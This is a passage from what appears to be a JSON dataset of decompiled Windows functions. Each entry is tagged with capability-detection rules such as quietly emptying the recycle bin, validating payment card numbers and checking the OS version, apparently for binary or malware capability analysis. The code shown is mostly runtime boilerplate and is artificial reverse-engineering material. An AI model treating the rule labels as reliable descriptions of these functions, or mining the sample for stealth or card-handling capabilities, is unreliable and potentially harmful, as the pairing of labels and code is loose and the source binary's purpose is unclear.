*CONCAT44(uStack252, uStack256) | 4;\ncode_r0x00014006925e:\n    ppauStackY576 = 0x140069273;\n    cVar5 = fcn.140024020(&stack0xfffffffffffffe58, &stack0xfffffffffffffe48);\n    if (cVar5 != '\\0') {\n        *CONCAT44(uStack252, uStack256) = *CONCAT44(uStack252, uStack256) | 2;\n    }\n    *ppauStack296 = auStack424._0_4_;\n    *(ppauStack296 + 4) = auStack424._4_4_;\n    *(ppauStack296 + 1) = uStack416;\n    *(ppauStack296 + 0xc) = uStack416._4_4_;\n    ppauStackY576 = 0x1400692ac;\n    fcn.140075fa0(CONCAT44(uStack380, CONCAT22(uStack382, uStack384)) + -0x18);\n    ppauStackY576 = 0x1400692c0;\n    fcn.140075fa0(CONCAT44(uStack388, uStack392) + -0x18);\n    return ppauStack296;\n}\n",
        "token_count": 31710
    },
    "14000eda": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nulong fcn.14000eda0(int32_t *arg1, int32_t *arg2, int32_t *arg3, int32_t **arg4)\n\n{\n    int32_t **ppiVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    ulong uVar4;\n    int32_t *piVar5;\n    int32_t **ppiVar6;\n    code *in_stack_00000028;\n    int32_t *piStack144;\n    int32_t *piStack120;\n    int32_t *piStack112;\n    ulong uStack104;\n    int32_t *piStack96;\n    int32_t **ppiStack88;\n    int32_t *piStack80;\n    int32_t **ppiStack72;\n    \n    iVar2 = *arg1;\n    ppiVar1 = *(arg1 + 8);\n    if ((arg1[1] & 0x20U) != 0) {\n        *(arg4[5] + 0x22) = *(arg1 + 0xe);\n        return 1;\n    }\n    piVar3 = arg1;\n    piVar5 = arg3;\n    ppiVar6 = arg4;\n    if (iVar2 == 0x21474343) goto code_r0x00014000ee80;\n    uStack104 = *(arg4[5] + 0x26);\n    piStack96 = *arg4;\n    ppiStack88 = *0x140102360;\n    piStack80 = *0x140102368;\n    ppiVar6 = ppiVar1;\n    ppiStack72 = arg4;\n    if (iVar2 == 0x22474343) {\n        piStack112 = ppiVar1[6];\n        piStack120 = &stack0xffffffffffffff98;\n        (*ppiVar1[2])(*0x140102360, 1, 10, *ppiVar1, ppiVar1);\n        piVar5 = *ppiVar1;\n        uVar4 = 10;\ncode_r0x00014000ee25:\n        piStack120 = &stack0xffffffffffffff98;\n        piVar3 = 0x1;\n        iVar2 = (*in_stack_00000028)(1, uVar4);\n        if (iVar2 == 8) {\n            return 1;\n        }\n        if (iVar2 == 7) {\n            ppiVar6 = arg1 + 8;\n            piVar5 = 0x4;\n            piVar3 = 0x21474343;\n            *(arg1 + 0xe) = piStack80;\n            *(arg1 + 10) = arg2;\n            *(arg1 + 0xc) = piStack96;\n            (*_sym.imp.KERNEL32.dll_RaiseException)(0x21474343, 1);\n        }\n    }\n    else {\n        if (iVar2 != 0x20474343) {\n            return 1;\n        }\n        piVar5 = *ppiVar1;\n        if ((arg1[1] & 6U) != 0) {\n            uVar4 = 2;\n            goto code_r0x00014000ee25;\n        }\n        piVar3 = 0x1;\n        piStack120 = &stack0xffffffffffffff98;\n        iVar2 = (*in_stack_00000028)(*0x140102360, 1, 1);\n        if (iVar2 == 8) {\n            return 1;\n        }\n        if (iVar2 == 6) {\n            piVar5 = *ppiVar1;\n            piVar3 = 0x1;\n            ppiVar6 = ppiVar1;\n            piStack120 = &stack0xffffffffffffff98;\n            iVar2 = (*in_stack_00000028)(1, 6);\n            if (iVar2 == 7) {\n                ppiVar1[3] = arg2;\n                ppiVar1[4] = piStack96;\n                ppiVar1[5] = piStack80;\n                *(arg1 + 0xe) = piStack80;\n                piStack112 = arg4[8];\n                arg1[6] = 4;\n                *(arg1 + 10) = arg2;\n                *(arg1 + 0xc) = piStack96;\n                piVar3 = arg2;\n                ppiVar6 = ppiStack88;\n                piStack120 = arg3;\n                (*_sym.imp.KERNEL32.dll_RtlUnwindEx)(arg2, piStack96);\n                piVar5 = arg1;\n            }\n        }\n    }\n    sub.msvcrt.dll_abort();\ncode_r0x00014000ee80:\n    if (arg2 != *(piVar3 + 10)) {\n        return 1;\n    }\n    piStack112 = ppiVar6[8];\n    piStack120 = piVar5;\n    (*_sym.imp.KERNEL32.dll_RtlUnwindEx)(arg2, *(piVar3 + 0xc), piVar3, ppiVar1);\n    uVar4 = 0x14000efbe;\n    sub.msvcrt.dll_abort();\n    *(arg2 + 4) = 0x0;\n    *(arg2 + 8) = 0x0;\n    *(arg2 + 0xc) = 0x0;\n    piStack144 = arg2;\n    (*_sym.imp.KERNEL32.dll_RaiseException)(0, 0x20474343, 0, 1, &stack0xffffffffffffff70, uVar4);\n    return 5;\n}\n",
        "token_count": 1215
    },
    "14000f2f": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00014000f5a1: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00014000f5a6)\n\nuint64_t fcn.14000f2f0(ulong *arg1)\n\n{\n    ulong uVar1;\n    int32_t *piVar2;\n    code *pcVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint64_t uVar10;\n    uint64_t *puVar11;\n    uint64_t *puVar12;\n    uint64_t uVar13;\n    ulong *arg1_00;\n    uchar *puVar14;\n    ulong *puVar15;\n    ulong unaff_RBP;\n    int32_t *piVar16;\n    uint64_t uVar17;\n    uint64_t uVar18;\n    uint64_t unaff_R12;\n    ulong unaff_R13;\n    uchar auStack56 [32];\n    \n    puVar14 = &stack0xffffffffffffffc8;\n    piVar16 = arg1[1];\n    uVar1 = *arg1;\n    if (piVar16 < 0x9) {\n        iVar7 = sub.msvcrt.dll_malloc();\n        if (iVar7 != 0) {\n            iVar9 = arg1[3];\n            *iVar7 = iVar7;\n            uVar8 = iVar7 + 8;\njoined_r0x00014000f368:\n            if (iVar9 != 0) {\n                uVar8 = sub.msvcrt.dll_memcpy(uVar8);\n                return uVar8;\n            }\n            uVar8 = sub.msvcrt.dll_memset(uVar8, 0, uVar1);\n            return uVar8;\n        }\n    }\n    else {\n        iVar9 = sub.msvcrt.dll_malloc();\n        if (iVar9 != 0) {\n            uVar8 = iVar9 + 7 + piVar16 & -piVar16;\n            *(uVar8 - 8) = iVar9;\n            iVar9 = arg1[3];\n            goto joined_r0x00014000f368;\n        }\n    }\n    sub.msvcrt.dll_abort();\n    while( true ) {\n        uVar18 = 0;\n        arg1_00 = NULL;\n        *0x1401291a0 = -1;\n        uVar8 = 0xffff;\n        *(puVar14 + -0x30) = 0x14000f3b1;\n        *0x1401291a8 = (*_sym.imp.KERNEL32.dll_CreateSemaphoreW)();\n        *(puVar14 + -0x30) = 0x14000f3be;\n        uVar4 = (*_sym.imp.KERNEL32.dll_TlsAlloc)();\n        if (uVar4 == 0xffffffff) {\n            *(puVar14 + -0x30) = 0x14000f3e6;\n            uVar10 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        }\n        else {\n            arg1_00 = uVar4;\n            *(puVar14 + -0x30) = 0x14000f3d7;\n            *0x140129198 = uVar4;\n            uVar10 = fcn.1400188b0(arg1_00, 0x14000f2a0);\n        }\n        if (uVar10 == 0) {\n            return uVar10;\n        }\n        *(puVar14 + -0x30) = 0x14000f3ed;\n        sub.msvcrt.dll_abort();\n        pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n        piVar2 = *0x140102a70;\n        *(puVar14 + -0x30) = unaff_R13;\n        *(puVar14 + -0x38) = unaff_R12;\n        *(puVar14 + -0x40) = unaff_RBP;\n        *(puVar14 + -0x48) = uVar1;\n        *(puVar14 + -0x50) = piVar16;\n        *(puVar14 + -0x58) = arg1;\n        if (**0x140102a70 == 0) {\n            if (arg1_00[2] != 0) {\n                return arg1_00[2];\n            }\n            *(puVar14 + -0x88) = 0x14000f495;\n            uVar8 = fcn.14000f2f0(arg1_00);\n            arg1_00[2] = uVar8;\n            return uVar8;\n        }\n        unaff_R12 = arg1_00[2];\n        if (unaff_R12 != 0) goto code_r0x00014000f431;\n        if (**0x140102a70 == 0) goto code_r0x00014000f5ba;\n        uVar18 = *0x1400f9430;\n        if (*0x1400f9430 != 0) goto code_r0x00014000f4bc;\n        LOCK();\n        *0x1400f9434 = *0x1400f9434 + 1;\n        if (*0x1400f9434 != 0) break;\n        puVar15 = puVar14 + -0x88;\n        puVar14 = puVar14 + -0x88;\n        *puVar15 = 0x14000f5a6;\n        arg1 = arg1_00;\n        piVar16 = *0x140102a70;\n    }\n    uVar8 = 0;\n    do {\n        *(puVar14 + -0x88) = 0x14000f614;\n        (*pcVar3)();\n    } while (*0x1400f9430 == 0);\n    if (*piVar2 == 0) {\ncode_r0x00014000f5ba:\n        unaff_R12 = arg1_00[2];\n        if (unaff_R12 == 0) {\ncode_r0x00014000f5c7:\n            unaff_R12 = *0x140129190 + 1;\n            *0x140129190 = unaff_R12;\n            arg1_00[2] = unaff_R12;\n            goto code_r0x00014000f4d7;\n        }\n    }\n    else {\ncode_r0x00014000f4bc:\n        LOCK();\n        *0x1401291a0 = *0x1401291a0 + 1;\n        if (*0x1401291a0 != 0) {\n            *(puVar14 + -0x88) = 0x14000f62e;\n            iVar6 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x1401291a8, 0xffffffff);\n            if (iVar6 != 0) {\n                LOCK();\n                *0x1401291a0 = *0x1401291a0 + -1;\n            }\n        }\n        unaff_R12 = arg1_00[2];\n        if (unaff_R12 == 0) goto code_r0x00014000f5c7;\ncode_r0x00014000f4d7:\n        if (*piVar2 != 0) {\n            LOCK();\n            *0x1401291a0 = *0x1401291a0 + -1;\n            if (-1 < *0x1401291a0) {\n                uVar8 = 0;\n                *(puVar14 + -0x88) = 0x14000f504;\n                (*_sym.imp.KERNEL32.dll_ReleaseSemaphore)(*0x1401291a8, 1);\n            }\n        }\n    }\ncode_r0x00014000f431:\n    pcVar3 = _sym.imp.KERNEL32.dll_GetLastError;\n    uVar4 = *0x140129198;\n    *(puVar14 + -0x88) = 0x14000f441;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    *(puVar14 + -0x88) = 0x14000f44b;\n    puVar11 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(uVar4);\n    *(puVar14 + -0x88) = 0x14000f456;\n    (*_sym.imp.KERNEL32.dll_SetLastError)(uVar5);\n    if (puVar11 == NULL) {\n        puVar11 = unaff_R12 + 0x21;\n        uVar10 = 8;\n        *(puVar14 + -0x88) = 0x14000f524;\n        puVar12 = sub.msvcrt.dll_calloc();\n        if (puVar12 == NULL) {\ncode_r0x00014000f643:\n            *(puVar14 + -0x88) = 0x14000f648;\n            uVar13 = sub.msvcrt.dll_abort();\n            if (*puVar11 < uVar10) {\n                *puVar11 = uVar10;\n                puVar11[3] = 0;\n            }\n            if (puVar11[1] < uVar8) {\n                puVar11[1] = uVar8;\n            }\n            if ((uVar18 != 0) && (*puVar11 == uVar10)) {\n                puVar11[3] = uVar18;\n                return uVar13;\n            }\n            return uVar13;\n        }\n        *puVar12 = unaff_R12 + 0x20;\n    }\n    else {\n        uVar13 = *puVar11;\n        puVar12 = puVar11;\n        if (unaff_R12 <= uVar13) goto code_r0x00014000f46b;\n        uVar17 = uVar13 * 2;\n        if (uVar13 * 2 < unaff_R12) {\n            uVar17 = unaff_R12 + 0x20;\n        }\n        uVar10 = uVar17 * 8 + 8;\n        *(puVar14 + -0x88) = 0x14000f579;\n        puVar12 = sub.msvcrt.dll_realloc();\n        if (puVar12 == NULL) goto code_r0x00014000f643;\n        *puVar12 = uVar17;\n        *(puVar14 + -0x88) = 0x14000f59f;\n        sub.msvcrt.dll_memset(puVar12 + uVar13 + 1, 0, (uVar17 - uVar13) * 8);\n    }\n    *(puVar14 + -0x88) = 0x14000f542;\n    iVar6 = (*_sym.imp.KERNEL32.dll_TlsSetValue)(*0x140129198, puVar12);\n    if (iVar6 == 0) {\n        *(puVar14 + -0x88) = 0x14000f54d;\n        (*pcVar3)();\n    }\ncode_r0x00014000f46b:\n    uVar8 = puVar12[unaff_R12];\n    if (uVar8 == 0) {\n        *(puVar14 + -0x88) = 0x14000f481;\n        uVar8 = fcn.14000f2f0(arg1_00);\n        puVar12[unaff_R12] = uVar8;\n    }\n    return uVar8;\n}\n",
        "token_count": 2523
    },
    "1400197b": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t ** fcn.1400197b0(code *arg1, uint8_t **arg2, uint8_t **arg3, uint8_t **arg4)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint8_t **ppuVar4;\n    code *arg1_00;\n    uint8_t uVar5;\n    uint8_t uVar6;\n    uint8_t **ppuVar7;\n    \n    uVar2 = arg1;\n    if (uVar2 == 0x50) {\n        ppuVar4 = arg3 + 7U & 0xfffffffffffffff8;\n        *arg4 = *ppuVar4;\n        return ppuVar4 + 1;\n    }\n    uVar3 = arg1 & 0xf;\n    if (0xc < uVar3) {\ncode_r0x0001400198ff:\n        sub.msvcrt.dll_abort();\n        (*arg1)();\n        arg1_00 = sub.msvcrt.dll_abort();\n        fcn.1400b6670(arg1_00);\n        sub.msvcrt.dll_abort();\n        (*arg1_00)();\n        fcn.1400b2e40();\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n        ppuVar4 = (*_sym.imp.msvcrt.dll_free)();\n        return ppuVar4;\n    }\n    ppuVar4 = arg3;\n    // switch table (13 cases) at 0x1400fd3e0\n    switch(*(uVar3 * 4 + 0x1400fd3e0) + 0x1400fd3e0) {\n    case 0x1400185e0:\n        goto code_r0x0001400198ff;\n    case 0x1400197e8:\n        ppuVar7 = *arg3;\n        ppuVar4 = arg3 + 1;\n        break;\n    case 0x140019848:\n        ppuVar7 = *arg3;\n        ppuVar4 = arg3 + 2;\n        break;\n    case 0x140019858:\n        ppuVar7 = *arg3;\n        ppuVar4 = arg3 + 4;\n        break;\n    case 0x140019868:\n        ppuVar7 = *arg3;\n        ppuVar4 = arg3 + 4;\n        break;\n    case 0x140019878:\n        ppuVar7 = *arg3;\n        ppuVar4 = arg3 + 2;\n        break;\n    case 0x140019888:\n        ppuVar7 = NULL;\n        uVar5 = 0;\n        do {\n            uVar6 = *ppuVar4;\n            ppuVar4 = ppuVar4 + 1;\n            uVar1 = uVar5 & 0x3f;\n            uVar5 = uVar5 + 7;\n            ppuVar7 = ppuVar7 | (uVar6 & 0x7f) << uVar1;\n        } while (uVar6 < '\\0');\n        break;\n    case 0x1400198b0:\n        ppuVar7 = NULL;\n        uVar3 = 0;\n        do {\n            uVar5 = *ppuVar4;\n            ppuVar4 = ppuVar4 + 1;\n            uVar6 = uVar3;\n            uVar3 = uVar3 + 7;\n            ppuVar7 = ppuVar7 | (uVar5 & 0x7f) << (uVar6 & 0x3f);\n        } while (uVar5 < '\\0');\n        if ((0x3f < uVar3) || ((uVar5 & 0x40) == 0)) break;\n        ppuVar7 = ppuVar7 | -1 << (uVar3 & 0x3f);\n        goto code_r0x0001400197f4;\n    }\n    if (ppuVar7 != NULL) {\ncode_r0x0001400197f4:\n        if ((uVar2 & 0x70) == 0x10) {\n            arg2 = arg3;\n        }\n        ppuVar7 = ppuVar7 + arg2;\n        if (uVar2 < '\\0') {\n            *arg4 = *ppuVar7;\n            return ppuVar4;\n        }\n    }\n    *arg4 = ppuVar7;\n    return ppuVar4;\n}\n",
        "token_count": 1013
    },
    "1400a695": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\nvoid fcn.1400a6950(int64_t **arg1)\n\n{\n    int64_t **ppiVar1;\n    int64_t *piVar2;\n    uint32_t uVar3;\n    int64_t *piVar4;\n    ulong arg1_00;\n    uint64_t *puVar5;\n    int64_t **ppiVar6;\n    uint64_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int64_t in_RDX;\n    int64_t iVar10;\n    \n    ppiVar6 = *arg1;\n    ppiVar1 = arg1 + 2;\n    if (ppiVar6 == ppiVar1) {\n        return;\n    }\n    piVar2 = arg1[1];\n    if (piVar2 < 0x8) {\n        if (piVar2 == NULL) {\n            *(arg1 + 2) = *ppiVar6;\n            goto code_r0x0001400a69b0;\n        }\n        uVar7 = (piVar2 + 1U) * 2;\n        uVar3 = uVar7;\n        if (7 < uVar3) {\n            arg1[2] = *ppiVar6;\n            *(arg1 + (uVar7 & 0xffffffff) + 8) = *(ppiVar6 + ((uVar7 & 0xffffffff) - 8));\n            iVar10 = ppiVar1 - (arg1 + 3 & 0xfffffffffffffff8);\n            uVar3 = uVar3 + iVar10 & 0xfffffff8;\n            if (7 < uVar3) {\n                uVar8 = 0;\n                do {\n                    uVar7 = uVar8;\n                    uVar8 = uVar8 + 8;\n                    *((arg1 + 3 & 0xfffffffffffffff8) + uVar7) = *(ppiVar6 + (uVar7 - iVar10));\n                } while (uVar8 < uVar3);\n            }\n            goto code_r0x0001400a69b0;\n        }\n        if ((uVar7 & 4) != 0) {\n            *(arg1 + 2) = *ppiVar6;\n            *(arg1 + (uVar7 & 0xffffffff) + 0xc) = *(ppiVar6 + ((uVar7 & 0xffffffff) - 4));\n            goto code_r0x0001400a69b0;\n        }\n        if ((uVar3 == 0) || (*(arg1 + 2) = *ppiVar6,  (uVar7 & 2) == 0)) goto code_r0x0001400a69b0;\n    }\n    else {\n        if (arg1[2] <= piVar2) {\n            return;\n        }\n        uVar7 = piVar2 + 1;\n        if (uVar7 >> 0x3e == 0) {\n            piVar4 = fcn.1400b6520(uVar7 * 2);\n            ppiVar6 = *arg1;\n            sub.msvcrt.dll_memcpy(piVar4, ppiVar6, uVar7 * 2);\n            if (ppiVar1 != ppiVar6) {\n                fcn.1400b64d0(ppiVar6);\n            }\n            *arg1 = piVar4;\n            arg1[2] = piVar2;\n            return;\n        }\n        if (uVar7 < 0) {\n            arg1_00 = fcn.1400b6fc0();\n            if (in_RDX == 1) {\n                fcn.1400b6670(arg1_00);\n                fcn.1400b6b70();\n            }\n            fcn.1400b6670(arg1_00);\n            puVar5 = fcn.1400b6980();\n            uVar7 = *puVar5;\n            if (uVar7 != 0) {\n                if (1 < *(uVar7 + 0x50) + 0xb8b1aabcbcd4d500U) {\n                    *puVar5 = 0;\ncode_r0x00014000f100:\n                    if (*(uVar7 + 0x58) != NULL) {\n    // WARNING: Could not recover jumptable at 0x00014000f111. Too many branches\n    // WARNING: Treating indirect jump as call\n                        (**(uVar7 + 0x58))(1, uVar7 + 0x50);\n                        return;\n                    }\n                    return;\n                }\n                iVar9 = *(uVar7 + 0x28);\n                if (iVar9 < 0) {\n                    iVar9 = iVar9 + 1;\n                    if (iVar9 == 0) {\n                        *puVar5 = *(uVar7 + 0x20);\n                    }\n                }\n                else {\n                    iVar9 = iVar9 + -1;\n                    if (iVar9 == 0) {\n                        *puVar5 = *(uVar7 + 0x20);\n                        goto code_r0x00014000f100;\n                    }\n                    if (iVar9 == -1) {\n                        fcn.1400b2e40();\n                        if ((*0x1400f9b78 < uVar7) && (uVar7 < *0x1400f9b78 + *0x1400f9b80)) {\n                            fcn.14001a1b0(uVar7);\n                            return;\n                        }\n    // WARNING: Could not recover jumptable at 0x0001400185e0. Too many branches\n    // WARNING: Treating indirect jump as call\n                        (*_sym.imp.msvcrt.dll_free)();\n                        return;\n                    }\n                }\n                *(uVar7 + 0x28) = iVar9;\n            }\n            return;\n        }\n        uVar3 = fcn.1400b6f80();\n    }\n    *(arg1 + uVar3 + 0xe) = *(ppiVar6 + (uVar3 - 2));\ncode_r0x0001400a69b0:\n    fcn.1400b64d0();\n    *arg1 = ppiVar1;\n    return;\n}\n",
        "token_count": 1349
    },
    "14000f79": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid fcn.14000f790(ulong arg1, ulong arg2)\n\n{\n    uint32_t uVar1;\n    uchar auStack12 [12];\n    \n    uVar1 = fcn.1400101c0(arg1, arg2, 0x1400f9460, auStack12);\n    // switch table (6 cases) at 0x1401023a0\n    switch(uVar1 & 7) {\n    case 1:\n    case 5:\n        break;\n    case 2:\n        break;\n    case 3:\n        break;\n    case 4:\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "14000f83": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 * fcn.14000f830(float10 *arg1, ulong arg2, ulong arg3)\n\n{\n    uint32_t uVar1;\n    int16_t aiStack36 [2];\n    ulong uStack32;\n    uchar auStack24 [16];\n    \n    auStack24._0_10_ = 0;\n    uVar1 = fcn.1400101c0(arg2, arg3, 0x1400f9480, aiStack36);\n    // switch table (6 cases) at 0x1401023c0\n    switch(uVar1 & 7) {\n    case 1:\n    case 5:\n        auStack24._0_10_ = CONCAT28(aiStack36[0] + 0x403e, auStack24._0_8_);\n    case 2:\n        auStack24._0_10_ = CONCAT28(auStack24._8_2_, uStack32);\n        break;\n    case 3:\n        auStack24._0_10_ = CONCAT46(*0x1401023d8, auStack24._0_6_);\n        if ((uVar1 & 8) == 0) goto code_r0x00014000f8a5;\n        goto code_r0x00014000f89e;\n    case 4:\n        auStack24._0_10_ = CONCAT46(*0x1401023dc, auStack24._0_6_);\n    }\n    if ((uVar1 & 8) != 0) {\ncode_r0x00014000f89e:\n        auStack24._0_10_ = auStack24._0_10_ | 0x8000;\n    }\ncode_r0x00014000f8a5:\n    *arg1 = auStack24._0_10_;\n    return arg1;\n}\n",
        "token_count": 411
    },
    "14000f68": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint64_t fcn.14000f680(ulong arg1, ulong arg2)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    ulong unaff_RBX;\n    int32_t aiStack20 [2];\n    uint32_t uStack12;\n    \n    uVar1 = fcn.1400101c0(arg1, arg2, 0x1400f9440, aiStack20);\n    uVar2 = unaff_RBX >> 0x20;\n    // switch table (7 cases) at 0x140102380\n    switch(uVar1 & 7) {\n    case 0:\n    case 6:\n        uVar2 = 0;\n        goto joined_r0x00014000f73e;\n    case 1:\n        uVar2 = (aiStack20[0] + 0x433) * 0x100000 | uStack12 & 0xffefffff;\njoined_r0x00014000f73e:\n        if ((uVar1 & 8) == 0) {\n            return uVar1;\n        }\n        goto code_r0x00014000f6e1;\n    case 2:\n        uVar2 = uStack12;\n        break;\n    case 3:\n        uVar2 = 0x7ff00000;\n        break;\n    case 4:\n        uVar2 = 0x7ff80000;\n        break;\n    case 5:\n        uVar2 = uStack12 | 0x7ff00000;\n    }\n    if ((uVar1 & 8) != 0) {\ncode_r0x00014000f6e1:\n        uVar1 = (uVar2 | 0x80000000) << 0x20;\n    }\n    return uVar1;\n}\n",
        "token_count": 397
    },
    "1400b6c1": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t fcn.1400b6c10(int64_t *arg1, ulong arg2, int64_t *arg3, int64_t arg4)\n\n{\n    int64_t *piVar1;\n    uint32_t uVar2;\n    int64_t *piVar3;\n    int64_t iStack72;\n    ulong uStack64;\n    ulong uStack56;\n    \n    if (arg1 != NULL) {\n        piVar3 = *(*arg1 + -0x10) + arg1;\n        piVar1 = *(*arg1 + -8);\n        iStack72 = 0;\n        uStack56 = 0x1000000000;\n        uStack64 = 0;\n        if ((*(*piVar3 + -8) == piVar1) &&\n           ((**(*piVar1 + 0x38))(piVar1, arg4, 6, arg3, piVar3, arg2, arg1, &iStack72),  iStack72 != 0)) {\n            if ((uStack56 & 6) == 6) {\n                return iStack72;\n            }\n            if ((uStack64 & uStack64._4_4_ & 6) == 6) {\n                return iStack72;\n            }\n            if (((uStack64._4_4_ & 5) != 4) && (uStack56 == 0)) {\n                if (arg4 < 0) {\n                    if ((arg4 != -2) &&\n                       (uVar2 = (**(*arg3 + 0x40))(arg3, arg4, iStack72, arg2, arg1),  (uVar2 & 6) == 6)) {\n                        return iStack72;\n                    }\n                }\n                else if (arg1 == iStack72 + arg4) {\n                    return iStack72;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 425
    },
    "14000f8e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint64_t fcn.14000f8e0(ulong arg1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar uStack11;\n    uint16_t uStack10;\n    \n    if (arg1 != -1) {\n        uStack11 = arg1;\n        uStack10 = 0xffff;\n        uVar1 = sub.msvcrt.dll____lc_codepage_func();\n        iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(uVar1, 8, &uStack11, 1, &uStack10, 1);\n        if (iVar2 != 0) {\n            return uStack10;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 159
    },
    "14000fc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint64_t fcn.14000fc00(int64_t arg1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int64_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    iVar4 = *(arg1 + 0x14);\n    iVar5 = iVar4;\n    piVar2 = arg1 + 0x18;\n    do {\n        if (*piVar2 != -1) {\n            *piVar2 = *piVar2 + 1;\n            return arg1;\n        }\n        piVar1 = piVar2 + 1;\n        *piVar2 = 0;\n        piVar2 = piVar1;\n    } while (piVar1 < arg1 + 0x18 + iVar5);\n    iVar3 = arg1;\n    if (*(arg1 + 0xc) <= iVar4) {\n        iVar3 = fcn.140016f80(*(arg1 + 8) + 1);\n        sub.msvcrt.dll_memcpy(iVar3 + 0x10, arg1 + 0x10, *(arg1 + 0x14) * 4 + 8);\n        fcn.140017070(arg1);\n        iVar4 = *(iVar3 + 0x14);\n        iVar5 = iVar4;\n    }\n    *(iVar3 + 0x14) = iVar4 + 1;\n    *(iVar3 + 0x18 + iVar5 * 4) = 1;\n    return iVar3;\n}\n",
        "token_count": 334
    },
    "14001320": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.140013200(ulong arg1, ulong arg2, ulong arg3, int64_t *arg4)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint64_t uVar4;\n    char *pcVar5;\n    uint64_t arg1_00;\n    char *pcVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    ulong auStack112 [5];\n    char acStack72 [8];\n    ulong uStack64;\n    \n    iVar8 = 1;\n    arg3._0_4_ = arg3 + -1;\n    arg1_00 = arg3;\n    while (arg3._0_4_ = arg3 / 10,  arg3 != 0) {\n        iVar8 = iVar8 + 1;\n    }\n    iVar2 = *(arg4 + 0x2c);\n    if (iVar2 == -1) {\n        *(arg4 + 0x2c) = 2;\n        iVar2 = 2;\n    }\n    if (iVar8 <= iVar2) {\n        iVar8 = iVar2;\n    }\n    iVar2 = *(arg4 + 0xc) - (iVar8 + 2);\n    if (*(arg4 + 0xc) <= iVar8 + 2) {\n        iVar2 = -1;\n    }\n    *(arg4 + 0xc) = iVar2;\n    uStack64 = 0x140013293;\n    fcn.140012e20(arg1, arg2, 1, arg4);\n    uVar9 = *(arg4 + 1);\n    *(arg4 + 2) = *(arg4 + 0x2c);\n    *(arg4 + 1) = uVar9 | 0x1c0;\n    uStack64 = 0x1400132b4;\n    fcn.140012060(uVar9 & 0x20 | 0x45, arg4);\n    *(arg4 + 0xc) = *(arg4 + 0xc) + iVar8 + 1;\n    iVar8 = *(arg4 + 2);\n    uVar9 = *(arg4 + 1);\n    iVar2 = *(arg4 + 0xc);\n    auStack112[0] = 0x140012997;\n    iVar3 = fcn.14000e880(arg1_00);\n    iVar3 = -iVar3;\n    pcVar1 = &stack0xffffffffffffffb8 + iVar3;\n    if ((uVar9 & 0x80) == 0) {\ncode_r0x0001400129b6:\n        pcVar5 = pcVar1;\n        if (arg1_00 != 0) goto code_r0x0001400129c2;\n    }\n    else {\n        if (-1 < arg1_00) {\n            uVar9 = uVar9 & 0xffffff7f;\n            *(arg4 + 1) = uVar9;\n            goto code_r0x0001400129b6;\n        }\n        arg1_00 = -arg1_00;\ncode_r0x0001400129c2:\n        pcVar5 = pcVar1;\n        while( true ) {\n            pcVar6 = pcVar5;\n            pcVar5 = pcVar6 + 1;\n            uVar4 = arg1_00 / 10;\n            *pcVar6 = arg1_00 + uVar4 * -10 + '0';\n            if (arg1_00 < 10) break;\n            arg1_00 = uVar4;\n            if ((((pcVar1 != pcVar5) && ((uVar9 & 0x1000) != 0)) && (*(arg4 + 4) != 0)) &&\n               ((pcVar5 - pcVar1 & 0x8000000000000003U) == 3)) {\n                *pcVar5 = ',';\n                pcVar5 = pcVar6 + 2;\n            }\n        }\n    }\n    pcVar6 = pcVar5;\n    if (iVar8 < 1) {\ncode_r0x000140012a80:\n        pcVar5 = pcVar6;\n        if ((pcVar1 != pcVar6) || (iVar8 == 0)) goto code_r0x000140012a91;\n    }\n    else {\n        iVar7 = iVar8 - (pcVar5 - pcVar1);\n        if (0 < iVar7) {\n            pcVar6 = pcVar5 + iVar7;\n            *(&stack0xffffffffffffff90 + 